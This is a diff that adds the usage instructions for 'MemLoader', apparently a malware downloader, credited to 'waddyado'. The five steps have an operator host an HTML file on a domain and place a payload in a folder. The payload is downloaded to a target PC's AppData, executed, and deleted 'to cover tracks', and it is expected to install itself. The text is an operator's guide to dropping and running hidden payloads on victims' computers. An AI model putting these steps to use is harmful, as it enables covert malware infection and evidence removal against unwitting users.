@@ -1,0 +1,8 @@
+MemLoader Instructions-------------------
+by waddyado
+
+1.Host data dumper HTML file to desired domain, specify in download_url
+2.put payload in /files folder to download to target PC
+3.files will be downloaded to AppData, executed, and then deleted in order to cover tracks
+4.payload should have self install capability, otherwise change payload_delete to false
+5.download_name should have same name as payload
